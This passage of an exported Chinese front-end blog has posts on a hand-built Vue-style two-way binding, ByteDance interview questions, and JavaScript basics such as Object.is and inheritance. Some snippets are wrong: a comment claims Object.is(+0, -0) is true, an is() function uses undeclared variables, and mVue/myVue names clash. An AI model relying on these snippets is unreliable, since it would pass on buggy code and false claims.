class="line">    padding:10px 30px;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div id=&quot;app&quot;&gt;</span><br><span class="line">        &lt;form&gt;</span><br><span class="line">          &lt;p&gt;请输入一个数:&lt;/p&gt;</span><br><span class="line">          &lt;input type=&quot;text&quot;  v-model=&quot;number&quot;&gt;</span><br><span class="line">          &lt;button type=&quot;button&quot; v-click=&quot;increment&quot;&gt;增加&lt;/button&gt;</span><br><span class="line">          &lt;h3 v-bind=&quot;number&quot;&gt;&lt;/h3&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="keyword">new</span> mVue(&#123;</span><br><span class="line">      el:<span class="string">'#app'</span>,</span><br><span class="line">      data: &#123;</span><br><span class="line">        number: <span class="number">0</span></span><br><span class="line">      &#125;,</span><br><span class="line">      methods: &#123;</span><br><span class="line">        increment: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="keyword">this</span>.number ++;</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;</span><br><span class="line"> &#125;)</span><br></pre></td></tr></table></figure>
<p>到这步我门正常引入vue就可以正常使用了。</p>
<p>下面就开始实现<br>先把mVue对象构造出来<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mVue</span>(<span class="params">options</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">this</span>.$options = options;</span><br><span class="line">    <span class="keyword">this</span>.$el = <span class="built_in">document</span>.querySelector(options.el);</span><br><span class="line">    <span class="keyword">this</span>.$data = options.data;</span><br><span class="line">    <span class="keyword">this</span>.$methods = options.methods;<span class="comment">//对参数的初始化</span></span><br><span class="line">    <span class="keyword">this</span>._observe(<span class="keyword">this</span>.$data)<span class="comment">//监听数据的变化</span></span><br><span class="line">    <span class="keyword">this</span>._complie(<span class="keyword">this</span>.$el);</span><br><span class="line">     <span class="keyword">this</span>._binding = &#123;&#125;;   <span class="comment">//_binding保存着model与view的映射关系，也就是我们前面定义的Watcher的实例。当model改变时，我们会触发其中的指令类更新，保证view也能实时更新</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>然后开始写观察者<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">mVue.prototype._observe = <span class="function"><span class="keyword">function</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> value;</span><br><span class="line">	<span class="keyword">for</span>(key <span class="keyword">in</span> obj)&#123;<span class="comment">//遍历obj对象</span></span><br><span class="line">		<span class="keyword">if</span>(obj.hasOwnProperty(key))&#123;<span class="comment">//去除obj中的继承属性</span></span><br><span class="line">			value =  obj[key];</span><br><span class="line">			<span class="keyword">this</span>._binding[key] = &#123;    <span class="comment">// 按照前面的数据，_binding = &#123;number: _directives: []&#125;                                                                                                                                        </span></span><br><span class="line">          	_directives: []</span><br><span class="line">        	&#125;;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">typeof</span> value === <span class="string">'object'</span>)&#123;<span class="comment">//如果是对象，继续遍历</span></span><br><span class="line">				<span class="keyword">this</span>._observe(value)</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">//关键的方法 方法会直接在一个对象上定义一个新属性，或者修改一个已经存在的属性， 并返回这个对象。</span></span><br><span class="line">			<span class="comment">/*参数说明 第一个 需要定义属性的对象. 第二个 需要定义或修改的属性的名字 第三个 修改的描述符 其中的参数 configurable 当且仅当该属性的 configurable 为 true 时，该属性描述符才能够被改变，也能够被删除。默认为 false。enumerable 当且仅当该属性的 enumerable 为 true 时，该属性才能够出现在对象的枚举属性中。默认为 false。*/</span></span><br><span class="line">			<span class="keyword">var</span> binding = <span class="keyword">this</span>._binding[key];</span><br><span class="line">			<span class="built_in">Object</span>.defineProperty(<span class="keyword">this</span>.$data,key,&#123;</span><br><span class="line">				  enumerable: <span class="literal">true</span>,</span><br><span class="line">		          configurable: <span class="literal">true</span>,</span><br><span class="line">		          get: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">		            <span class="built_in">console</span>.log(<span class="string">`获取<span class="subst">$&#123;value&#125;</span>`</span>);</span><br><span class="line">		            <span class="keyword">return</span> value;</span><br><span class="line">		          &#125;,</span><br><span class="line">		          set: <span class="function"><span class="keyword">function</span> (<span class="params">newVal</span>) </span>&#123;</span><br><span class="line">		            <span class="built_in">console</span>.log(<span class="string">`更新<span class="subst">$&#123;newVal&#125;</span>`</span>);</span><br><span class="line">		            <span class="keyword">if</span> (value !== newVal) &#123;</span><br><span class="line">		              value = newVal;</span><br><span class="line">		               binding._directives.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">item</span>) </span>&#123;  </span><br><span class="line">		               	<span class="comment">// 当number改变时，触发_binding[number]._directives 中的绑定的Watcher类的更新</span></span><br><span class="line">                		item.update();</span><br><span class="line">		           &#125;</span><br><span class="line">			&#125;)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>现在有了这个方法 需要一个来触发它<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Watcher</span>(<span class="params">name, el, vm, exp, attr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;         <span class="comment">//指令名称，例如文本节点，该值设为"text"</span></span><br><span class="line">    <span class="keyword">this</span>.el = el;             <span class="comment">//指令对应的DOM元素</span></span><br><span class="line">    <span class="keyword">this</span>.vm = vm;             <span class="comment">//指令所属myVue实例</span></span><br><span class="line">    <span class="keyword">this</span>.exp = exp;           <span class="comment">//指令对应的值，本例如"number"</span></span><br><span class="line">    <span class="keyword">this</span>.attr = attr;         <span class="comment">//绑定的属性值，本例为"innerHTML"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.update();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Watcher.prototype.update = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">     <span class="comment">//比如 H3.innerHTML = this.data.number; 当number改变时，会触发这个update函数，保证对应的DOM内容进行了更新。</span></span><br><span class="line">     <span class="keyword">this</span>.el[<span class="keyword">this</span>.attr] = <span class="keyword">this</span>.vm.$data[<span class="keyword">this</span>.exp];</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
<p>现在需要实现对指令的解析<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">myVue.prototype._complie = <span class="function"><span class="keyword">function</span> (<span class="params">root</span>) </span>&#123; root 为 id为app的Element元素，也就是我们的根元素</span><br><span class="line">    <span class="keyword">var</span> _this = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">var</span> nodes = root.children;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; nodes.length; i++) &#123;</span><br><span class="line">      <span class="keyword">var</span> node = nodes[i];</span><br><span class="line">      <span class="keyword">if</span> (node.children.length) &#123;  <span class="comment">// 对所有元素进行遍历，并进行处理</span></span><br><span class="line">        <span class="keyword">this</span>._complie(node);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (node.hasAttribute(<span class="string">'v-click'</span>)) &#123;  <span class="comment">// 如果有v-click属性，我们监听它的onclick事件，触发increment事件，即number++</span></span><br><span class="line">        node.onclick = (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="keyword">var</span> attrVal = nodes[i].getAttribute(<span class="string">'v-click'</span>);</span><br><span class="line">          <span class="keyword">return</span> _this.$methods[attrVal].bind(_this.$data);  <span class="comment">//bind是使data的作用域与method函数的作用域保持一致</span></span><br><span class="line">        &#125;)();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (node.hasAttribute(<span class="string">'v-model'</span>) &amp;&amp; (node.tagName == <span class="string">'INPUT'</span> || node.tagName == <span class="string">'TEXTAREA'</span>)) &#123; <span class="comment">// 如果有v-model属性，并且元素是INPUT或者TEXTAREA，我们监听它的input事件</span></span><br><span class="line">        node.addEventListener(<span class="string">'input'</span>, (<span class="function"><span class="keyword">function</span>(<span class="params">key</span>) </span>&#123;  </span><br><span class="line">          <span class="keyword">var</span> attrVal = node.getAttribute(<span class="string">'v-model'</span>);</span><br><span class="line">           <span class="comment">//_this._binding['number']._directives = [一个Watcher实例]</span></span><br><span class="line">           <span class="comment">// 其中Watcher.prototype.update = function () &#123;</span></span><br><span class="line">           <span class="comment">//    node['vaule'] = _this.$data['number'];  这就将node的值保持与number一致</span></span><br><span class="line">           <span class="comment">// &#125;</span></span><br><span class="line">          _this._binding[attrVal]._directives.push(<span class="keyword">new</span> Watcher(  </span><br><span class="line">            <span class="string">'input'</span>,</span><br><span class="line">            node,</span><br><span class="line">            _this,</span><br><span class="line">            attrVal,</span><br><span class="line">            <span class="string">'value'</span></span><br><span class="line">          ))</span><br><span class="line"></span><br><span class="line">          <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            _this.$data[attrVal] =  nodes[key].value; <span class="comment">// 使number 的值与 node的value保持一致，已经实现了双向绑定</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;)(i));</span><br><span class="line">      &#125; </span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (node.hasAttribute(<span class="string">'v-bind'</span>)) &#123; <span class="comment">// 如果有v-bind属性，我们只要使node的值及时更新为data中number的值即可</span></span><br><span class="line">        <span class="keyword">var</span> attrVal = node.getAttribute(<span class="string">'v-bind'</span>);</span><br><span class="line">        _this._binding[attrVal]._directives.push(<span class="keyword">new</span> Watcher(</span><br><span class="line">          <span class="string">'text'</span>,</span><br><span class="line">          node,</span><br><span class="line">          _this,</span><br><span class="line">          attrVal,</span><br><span class="line">          <span class="string">'innerHTML'</span></span><br><span class="line">        ))</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="/images/1.gif" alt="My Pic"></p>
]]></content>
      <categories>
        <category>Javascript</category>
      </categories>
      <tags>
        <tag>JS</tag>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>字节面</title>
    <url>/2019/04/26/%E5%AD%97%E8%8A%82%E9%9D%A2/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;等了一段时间，终于等来了字节跳动的第二次面试。自己提前也稍微准备了一下，但是一到面试的时候太容易紧张了，而且问的问题还是挺细的，偏原理。自己稍不注意就答偏了。最终还是挂了，下来之后自己也查了一下面试中自己觉得答得有些问题的题，结果发现确实是自己的问题，回答的太差了，有些基本上完全错了。于是自己想说还是想总结一下吧，下面就是面试中遇到的一些问题：<br><a id="more"></a></p>
<h2 id="1-vue2-和-3有哪些不同"><a href="#1-vue2-和-3有哪些不同" class="headerlink" title="1.vue2 和 3有哪些不同"></a>1.vue2 和 3有哪些不同</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;这个问题自己一开始就答错了，理解成了vue-cli3与2的不同。结果面试官直接回了一句这个已经发布了么。我心想不是已经可以用了么，感觉有点不妙。下来之后自己也查了一下，vue3.0的一些特点吧，首先上一张盗的图。<br><img src="/images/vue3.png" alt="My Pic"><br>对自己来说可能了解的就只有双向数据绑定的区别，2是使用的Object.defineProperty 3使用的Proxy 的 observer 实现。使用2中的方法会有一点局限性：<br>（1）对属性的添加、删除动作的监测<br>（2）对数组基于下标的修改、对于 .length 修改的监测<br>（3）对 Map、Set、WeakMap 和 WeakSet 的支持<br>使用3的话消除了以前存在的警告，使速度加倍，并节省了一半的内存开销。<br>然后自己又查了一下资料总结一些变化如下：<br>（1）3中代码进行了重构代码库现在改为了用 TypeScript 编写 ，还有一些包的拆分。<br>（2）重写虚拟 DOM (Virtual DOM Rewrite) 随着虚拟 DOM 重写，我们可以期待更多的 编译时（compile-time）提示来减少 运行时（runtime）开销。重写将包括更有效的代码来创建虚拟节点。<br>（3）优化插槽生成(Optimized Slots Generation)  2.0 组件的重新渲染就是组件粒度的，除非修改的数据是子组件的 props，才会触发子组件的重新渲染。使用 Vue 3 ，可以单独重新渲染父组件和子组件。</p>
<h2 id="2-vuex的作用及使用场景"><a href="#2-vuex的作用及使用场景" class="headerlink" title="2.vuex的作用及使用场景"></a>2.vuex的作用及使用场景</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;这个问题首先是问的你知道的组件之间传递值的方法，然后后是为什么引入vuex而不使用一个顶层的全局对象。<br>&nbsp;&nbsp;&nbsp;&nbsp;传值的话，我们都知道父到子使用props，子到父使用emit监听事件。还可以使用eventbus来进行组件之间的传值。还可以使用路由和slot来传值。然后后面这个问题就有点懵逼了，自己就答了，就是为了方便数据管理和组件间数据同步。还有就是vuex还封装了很多的方法方便我们来操作数据。<br>看到一篇不错的文章解析<a href="https://blog.csdn.net/muzidigbig/article/details/83784037" target="_blank" rel="noopener">为什么要使用vuex</a></p>
<h2 id="3-原型链实现继承的缺点"><a href="#3-原型链实现继承的缺点" class="headerlink" title="3.原型链实现继承的缺点"></a>3.原型链实现继承的缺点</h2><p>当父类中含有复杂数据类型时，子类对该属性的修改也会影响到其他的子类的该属性。子类型的实例无法在不影响所有对象的情况下，给父类型的构造函数传递参数。</p>
<h2 id="4-浏览器加载完整过程"><a href="#4-浏览器加载完整过程" class="headerlink" title="4.浏览器加载完整过程"></a>4.浏览器加载完整过程</h2><p>简单的总结起来有下面这几个过程<br>1、浏览器的地址栏输入URL并按下回车。<br>2、浏览器查找当前URL是否存在缓存，并比较缓存是否过期。<br>3、DNS解析URL对应的IP。<br>4、根据IP建立TCP连接（三次握手）。<br>5、HTTP发起请求。<br>6、服务器处理请求，浏览器接收HTTP响应。<br>7、渲染页面，构建DOM树，css树。<br>8、关闭TCP连接（四次挥手）。<br>细节方面可以参考这篇文章<a href="https://www.cnblogs.com/daijinxue/p/6640153.html" target="_blank" rel="noopener">从输入url到页面加载完成发生了什么？——前端角度</a></p>
<h2 id="5-http2-与1的区别"><a href="#5-http2-与1的区别" class="headerlink" title="5.http2 与1的区别"></a>5.http2 与1的区别</h2><p>（1）HTTP/2采用二进制格式而非文本格式<br>（2）HTTP/2是完全多路复用的，而非有序并阻塞的——只需一个连接即可实现并行<br>（3）使用报头压缩，HTTP/2降低了开销<br>（4）HTTP/2让服务器可以将响应主动“推送”到客户端缓存中</p>
<h2 id="6-http请求优化"><a href="#6-http请求优化" class="headerlink" title="6.http请求优化"></a>6.http请求优化</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;这里其实呢也是前端性能优化中的一个部分。我们自己也可以总结出很多条。首先我们都知道的是要减少http请求。那为什么这样就能优化呢？首先HTTP请求建立和释放需要时间，浏览器对同一个域名的并发数量有限制。解决方发简单的就是合并合并脚本和样式表、内联图片 &amp; base64、CSS Sprites技术，从http协议的角度具体可以参考Http2与Http1的区别。</p>
<h2 id="7-JS继承为何要修正constructor"><a href="#7-JS继承为何要修正constructor" class="headerlink" title="7.JS继承为何要修正constructor"></a>7.JS继承为何要修正constructor</h2><p>这个问题自己以前确实没有注意过，被问到的时候只有说不知道了，查了一下这段代码如下。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">a.prototype.constructor = a</span><br></pre></td></tr></table></figure></p>
<p>我的理解是如果没有这句话别的东西显示new 子类的话其constructor会指向父类<br>具体的理解可以参考这篇文章<a href="https://www.cnblogs.com/SheilaSun/p/4397918.html" target="_blank" rel="noopener">为什么要做A.prototype.constructor=A这样的修正？</a></p>
<h2 id="8-为什么要使用virture-dom"><a href="#8-为什么要使用virture-dom" class="headerlink" title="8.为什么要使用virture dom"></a>8.为什么要使用virture dom</h2><p>首先我们都知道使用virture dom之后能提高页面的渲染效率，具体是怎么实现的呢？<br>我的理解是在原来的基础上增加了一层虚拟dom层，当页面发生改变时，会先将虚拟dom进行相应的改变然后再通过像diff算法这样的，找出两个dom的区别，再操作真正的dom，这样避免了真实dom的频繁操作。<br>具体细节可以参考这篇文章<a href="https://www.cnblogs.com/SheilaSun/p/4397918.html" target="_blank" rel="noopener">你不知道的virture dom</a></p>
<h2 id="9-vue单页面应用与-普通的加载顺序是否有差别"><a href="#9-vue单页面应用与-普通的加载顺序是否有差别" class="headerlink" title="9.vue单页面应用与 普通的加载顺序是否有差别"></a>9.vue单页面应用与 普通的加载顺序是否有差别</h2><p>见这篇文章<a href="https://juejin.im/post/5a0ea4ec6fb9a0450407725c" target="_blank" rel="noopener">前端：你要懂的单页面应用和多页面应用</a></p>
<h2 id="10-实现模板字符串功能"><a href="#10-实现模板字符串功能" class="headerlink" title="10.实现模板字符串功能"></a>10.实现模板字符串功能</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> data = &#123;</span><br><span class="line">    name:<span class="string">'xbd'</span>,</span><br><span class="line">    age:<span class="number">18</span>,</span><br><span class="line">    job:<span class="string">'CTO'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> templateStr = <span class="string">'i am &#123;&#123;name&#125;&#125;,age &#123;&#123;age&#125;&#125;,job &#123;&#123;job&#125;&#125; '</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">templateFunc</span>(<span class="params">str,data</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> computed = str.replace(<span class="regexp">/\&#123;\&#123;(\w+)\&#125;\&#125;/g</span>,<span class="function"><span class="keyword">function</span> (<span class="params">match,key</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(match)</span><br><span class="line">    <span class="keyword">return</span> data[key];</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">return</span> computed;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(templateFunc(templateStr,data));</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>面试</category>
      </categories>
      <tags>
        <tag>面试</tag>
        <tag>Javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>总结JS的一些小知识</title>
    <url>/2019/10/26/%E6%80%BB%E7%BB%93JS%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;最近工作一直挺忙的，也没时间学一些东西，而且感觉自己也好久没复习了总结JS的知识了（上次面试之后）加上最近又看到了别人写的一篇blog，发现还是有一些自己没掌握和比较模糊的点，下面就简单总结一下：<br><a id="more"></a></p>
<h3 id="1-NULL是对象么？"><a href="#1-NULL是对象么？" class="headerlink" title="1. NULL是对象么？"></a>1. NULL是对象么？</h3><blockquote>
<p>看到这个问题的时候自己第一反应感觉不是，虽然typeof null == ‘object’ 但是要自己说出原因 还是说不太明白</p>
</blockquote>
<ul>
<li>答案肯定也是null不是对象</li>
</ul>
<blockquote>
<p>原因：typeof null 为object是 JS 中存在的一个悠久 Bug。<br>在 JS 的最初版本中使用的是 32 位系统，为了性能考虑使用低位存储变量的类型信息，000 开头代表是对象然而 null 表示为全零，所以将它错误的判断为 object 。</p>
</blockquote>
<h3 id="2-‘1’-toString-可以调用么"><a href="#2-‘1’-toString-可以调用么" class="headerlink" title="2. ‘1’.toString()可以调用么?"></a>2. ‘1’.toString()可以调用么?</h3><blockquote>
<p>自已最开始是觉得不可以，所以马上试了试结果打脸了，是可以的，之前自己认为这个只能是非字符串类型才能调用（number、object）</p>
<p>看了官方文档的说明：每个对象都有一个 toString() 方法，当该对象被表示为一个文本值时，或者一个对象以预期的字符串方式引用时自动调用。</p>
<p>因此这里的’1’.toString()可以分为以下几步<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">'1'</span>)</span><br><span class="line">str.toString()</span><br><span class="line">str = <span class="literal">null</span></span><br></pre></td></tr></table></figure></p>
</blockquote>
<p>*也很容易联想到1.toString()  这里是不能执行的 会报错</p>
<blockquote>
<p>因为在JS中,.点操作符意味着调用Object的属性或者这是一个浮点数。当.跟在一个数字后面就意味着这个数字是一个浮点数，在.后面JS等待着一个数字。<br>所以在调用.toString()之前，我们需要告诉JS这是就是我们要的数字。需要使用以下的写法<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>.toString() <span class="comment">//1.就是1.0就是1</span></span><br><span class="line"><span class="number">1.0</span>.toString() <span class="comment">//与上面同理</span></span><br><span class="line">(<span class="number">1</span>).toString() <span class="comment">//(1)是一个表达式代表这就是一个1</span></span><br><span class="line"><span class="number">1</span> .toString()</span><br><span class="line"><span class="number">1</span><span class="comment">//换行，奇葩写法，与上面一样</span></span><br><span class="line">toString()</span><br></pre></td></tr></table></figure></p>
</blockquote>
<h3 id="3-Object-is-和-区别"><a href="#3-Object-is-和-区别" class="headerlink" title="3. Object.is 和 === 区别"></a>3. Object.is 和 === 区别</h3><blockquote>
<p>Object.is 自己用的比较少所以先去试了以下它的功能 它和全等类似都是需要值和类型都相等的时候才会为true<br>但是自己依稀记得===中会有一些特殊情况<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">+<span class="number">0</span> === <span class="number">-0</span>  <span class="comment">//true</span></span><br><span class="line">+<span class="number">0</span> === <span class="number">0</span> <span class="comment">//true</span></span><br><span class="line"><span class="number">-0</span> === <span class="number">0</span> <span class="comment">//true</span></span><br><span class="line"><span class="literal">NaN</span> === <span class="literal">NaN</span> <span class="comment">// false</span></span><br></pre></td></tr></table></figure></p>
</blockquote>
<p>*Object.is修复了这些问题<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Object</span>.is(<span class="literal">NaN</span>, <span class="literal">NaN</span>) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Object</span>.is(+<span class="number">0</span>, <span class="number">-0</span>) <span class="comment">//true</span></span><br><span class="line"><span class="built_in">Object</span>.is(+<span class="number">0</span>, <span class="number">0</span>)<span class="comment">// true</span></span><br><span class="line"><span class="built_in">Object</span>.is(<span class="number">-0</span>, <span class="number">0</span>)<span class="comment">// false</span></span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>Object.is的实现<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is</span>(<span class="params">left, right</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x === y) &#123;</span><br><span class="line">        <span class="keyword">return</span> x !== <span class="number">0</span> || y !== <span class="number">0</span> || <span class="number">1</span>/x === <span class="number">1</span>/y</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> x !== x &amp;&amp; y !== y</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>1/x === 1/y 只有为 0 和 +0 才相等 -Infinity 不等于 Infinity   并且只有NaN不等于其本身</p>
</blockquote>
<h3 id="4-JS中实现继承"><a href="#4-JS中实现继承" class="headerlink" title="4. JS中实现继承"></a>4. JS中实现继承</h3><h4 id="1-利用call和apply"><a href="#1-利用call和apply" class="headerlink" title="1.利用call和apply"></a>1.利用call和apply</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parent1</span> (<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">child1</span> (<span class="params">age</span>) </span>&#123;</span><br><span class="line">    parent1.call(<span class="keyword">this</span>, <span class="string">'小花'</span>)</span><br><span class="line">    <span class="keyword">this</span>.age = age</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">new</span> child1(<span class="number">12</span>))</span><br></pre></td></tr></table></figure>
<p><img src="/images/js1.png" alt="My Pic"><br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parent1</span> (<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name</span><br><span class="line">  &#125;</span><br><span class="line">  parent1.prototype.getName = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="keyword">this</span>.name)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">child1</span> (<span class="params">age</span>) </span>&#123;</span><br><span class="line">    parent1.call(<span class="keyword">this</span>, <span class="string">'小花'</span>)</span><br><span class="line">    <span class="keyword">this</span>.age = age</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">new</span> child1(<span class="number">12</span>))</span><br></pre></td></tr></table></figure></p>
<p><img src="/images/js2.png" alt="My Pic"></p>
<blockquote>
<p>能看到成功的继承到了父元素的属性 但是原型上的方法却无法继承 所以就有了下面的一种方法</p>
</blockquote>
<h4 id="2-利用原型链"><a href="#2-利用原型链" class="headerlink" title="2. 利用原型链"></a>2. 利用原型链</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parent2</span> (<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name</span><br><span class="line">  &#125;</span><br><span class="line">  parent2.prototype.getName = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="keyword">this</span>.name)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">child2</span> (<span class="params">age</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.age = age</span><br><span class="line">  &#125;</span><br><span class="line">  child2.prototype = <span class="keyword">new</span> parent2(<span class="string">'小花'</span>)</span><br><span class="line">  <span class="keyword">let</span> c2 = <span class="keyword">new</span> child2(<span class="number">12</span>)</span><br><span class="line">  <span class="built_in">console</span>.log(c2);</span><br><span class="line">  c2.getName()</span><br></pre></td></tr></table></figure>
<p><img src="/images/js3.png" alt="My Pic"></p>
<blockquote>
<p>可以看到能够继承属性和方法 但是也存在一个问题 每次new的子类其实都是共用的一个父类的原型，导致一些引用类型发生变化之后，所有子类的都会发生变化<br><img src="/images/js4.png" alt="My Pic"></p>
</blockquote>
<h4 id="3-将前两种组合"><a href="#3-将前两种组合" class="headerlink" title="3.将前两种组合"></a>3.将前两种组合</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parent3</span> (<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name</span><br><span class="line">    <span class="keyword">this</span>.arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">  &#125;</span><br><span class="line">  parent3.prototype.getName = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="keyword">this</span>.name)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">child3</span> (<span class="params">age</span>) </span>&#123;</span><br><span class="line">    parent3.call(<span class="keyword">this</span>, <span class="string">'小花'</span>)</span><br><span class="line">    <span class="keyword">this</span>.age = age</span><br><span class="line">  &#125;</span><br><span class="line">  child3.prototype = <span class="keyword">new</span> parent3()</span><br><span class="line">  <span class="keyword">var</span> c3 = <span class="keyword">new</span> child3();</span><br><span class="line">  <span class="keyword">var</span> c33 = <span class="keyword">new</span> child3();</span><br><span class="line">  <span class="built_in">console</span>.log(c3)</span><br><span class="line">  <span class="built_in">console</span>.log(c33);</span><br><span class="line">  c3.arr.push(<span class="number">4</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(c3)</span><br><span class="line">  <span class="built_in">console</span>.log(c33);</span><br></pre></td></tr></table></figure>
<p><img src="/images/js5.png" alt="My Pic"></p>
<blockquote>
<p>由于属性都加再了子类上就不会出现上面的问题 基本上就实现了 但是还有可以优化的点（Parent3的构造函数会多执行了一次）</p>
</blockquote>
<h4 id="4-组合继承优化1-0"><a href="#4-组合继承优化1-0" class="headerlink" title="4. 组合继承优化1.0"></a>4. 组合继承优化1.0</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">child3.prototype = parent3.prototype</span><br></pre></td></tr></table></figure>
<blockquote>
<p>只需将赋值改为这种形式 通过在构造函数中打印可以发现次数少了一次赋值时 但是这样赋值之后查看new出来的子类对象可以发现其constructor变为了parent，这肯定不对 于是还需要优化<br><img src="/images/js6.png" alt="My Pic"></p>
</blockquote>
<h4 id="5-组合继承优化2-0"><a href="#5-组合继承优化2-0" class="headerlink" title="5. 组合继承优化2.0"></a>5. 组合继承优化2.0</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">child3.prototype = <span class="built_in">Object</span>.create(parent3.prototype)</span><br><span class="line">child3.prototype.constructor = child3</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里使用Object.create来创建了一个指向parent.prototype的对象，最重要的是将子类的构造函数指向了子类<br>这种方式也叫寄生组合继承<br><img src="/images/js7.png" alt="My Pic"></p>
</blockquote>
]]></content>
      <categories>
        <category>JavaScript</category>
